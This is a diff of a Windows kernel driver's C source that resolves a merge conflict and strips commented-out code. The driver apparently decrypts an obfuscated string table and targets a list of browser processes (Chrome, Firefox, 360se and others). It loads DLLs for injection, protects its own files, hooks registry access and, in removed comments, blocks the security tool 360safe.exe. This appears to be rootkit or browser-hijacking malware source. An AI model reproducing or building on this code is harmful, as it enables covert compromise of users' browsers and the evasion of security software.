@@ -60,17 +60,17 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     PDEVICE_OBJECT pDevObj;
     WCHAR pBrowser[][20] = {L"", L"", L"", L"", L"", L"", L"", L"", L"", L"", L"", L"", L"", L"", L"", L""};
     int i = 0;
-
+    
     ReadDriverParameters(pRegistryString);
     pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
     pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
     pDriverObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutDown;
     // Dispatch routine for communications
     pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
-
+    
     // Unload routine
     pDriverObj->DriverUnload = DriverUnload;
-
+    
     // Initialize the device name.
     RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);
 
@@ -101,7 +101,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 
     // Create a symbolic link to allow USER applications to access it.
     status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);
-
+    
     if (!NT_SUCCESS(status))
     {
         dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
@@ -115,37 +115,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     //
     //  TODO: Add initialization code here.
     //
-<<<<<<< HEAD
-//浏览器 
-	MyDecryptFile(strbrowser,sizeof(strbrowser),0xb);
-	if (TRUE)
-		{ 
-			
-			CHAR *pnext=(CHAR*)strbrowser;
-			CHAR *pRetBuff=NULL;
-			pRetBuff =	strtok_s(pnext,"\r",&pnext);
-			while (_stricmp(pnext,"")!=0)
-			{
-	
-				ANSI_STRING AnsiString2;
-				UNICODE_STRING UnicodeString2;
-				RtlInitString(&AnsiString2, pRetBuff);
-				status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
-	
-				g_pStrBuffer[g_iStrBuffer]=(WCHAR*)kmalloc(UnicodeString2.Length+2);
-				memset(g_pStrBuffer[g_iStrBuffer],0,UnicodeString2.Length+2);
-				memcpy(g_pStrBuffer[g_iStrBuffer],UnicodeString2.Buffer,UnicodeString2.Length);
-				RtlFreeUnicodeString(&UnicodeString2);
 
-//				kprintf("g_iStrBuffer:%d name:%s",g_iStrBuffer,pRetBuff);
-
-				
-				g_iStrBuffer++;
-				pRetBuff= strtok_s((PCHAR)pnext,"\r",&pnext);
-			} 
-	
-		}
-=======
     //浏览器
     MyDecryptFile(strbrowser, sizeof(strbrowser), 0xb);
     if (TRUE)
@@ -161,8 +131,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
             UNICODE_STRING UnicodeString2;
             RtlInitString(&AnsiString2, pRetBuff);
             status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
->>>>>>> 715ea1bb3d9a9a1715795129428a6c0b68bfd001
-
             g_pStrBuffer[g_iStrBuffer] = (WCHAR *)kmalloc(UnicodeString2.Length + 2);
             memset(g_pStrBuffer[g_iStrBuffer], 0, UnicodeString2.Length + 2);
             memcpy(g_pStrBuffer[g_iStrBuffer], UnicodeString2.Buffer, UnicodeString2.Length);
@@ -171,7 +139,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
             //				kprintf("g_iStrBuffer:%d name:%s",g_iStrBuffer,pRetBuff);
 
             g_iStrBuffer++;
-            pRetBuff = strtok_s((PCHAR)pnext, "\r\n", &pnext);
+            pRetBuff = strtok_s((PCHAR)pnext, "\r", &pnext);
         }
     }
 
@@ -181,20 +149,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
         AppendListNode(g_pStrBuffer[i], &g_ListProcess, 0);
     }
 
-    //AppendListNode(L"360se.exe",&g_ListProcess,0);
-    //AppendListNode(L"chrome.exe",&g_ListProcess,0);
-    //AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
-    //AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
-    //AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
-    //AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
-    //AppendListNode(L"firefox.exe",&g_ListProcess,0);
-    //AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
-    //AppendListNode(L"liebao.exe",&g_ListProcess,0);
-    //AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
-    //AppendListNode(L"iexplore.exe",&g_ListProcess,0);
-    //AppendListNode(L"360chrome.exe",&g_ListProcess,0);
-    //AppendListNode(L"opera.exe",&g_ListProcess,0);
-    //AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
 
     //要保护的文件
     InitializeListHead(&g_ProtectFile);
@@ -202,12 +156,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     AppendListNode(g_pStrBuffer[14], &g_ProtectFile, 2);
     AppendListNode(g_pStrBuffer[15], &g_ProtectFile, 1);
     //不让访问的进程名
-    //InitializeListHead(&g_AntiProcess);
-    //KeInitializeSpinLock(&g_spin_process);
-    //AppendListNode(L"360safe.exe",&g_AntiProcess,0);
 
-    ////kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
-    //status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
 #ifdef _AMD64_
     //x64 add code
     status = MzReadFile(g_pStrBuffer[16], &g_pDll64, &g_iDll64);
@@ -307,7 +256,7 @@ NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
     pIrp->IoStatus.Information = 0;
 
     IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-
+    
     return STATUS_SUCCESS;
 }
 
@@ -351,7 +300,7 @@ NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
     case IOCTL_HELLO_WORLD:
     {
         dprintf("MY_CTL_CODE(0)=%d\r\n,MY_CTL_CODE");
-
+        
         // Return success
         status = STATUS_SUCCESS;
     }
@@ -1492,6 +1441,7 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
     case RegNtPreOpenKeyEx:
     {
         PREG_CREATE_KEY_INFORMATION KeyInfo = (PREG_CREATE_KEY_INFORMATION)Argument2;
+		
         WCHAR exename[216] = {0};
         WCHAR PathReg[512] = {0};
         PUNICODE_STRING RootKeyName;
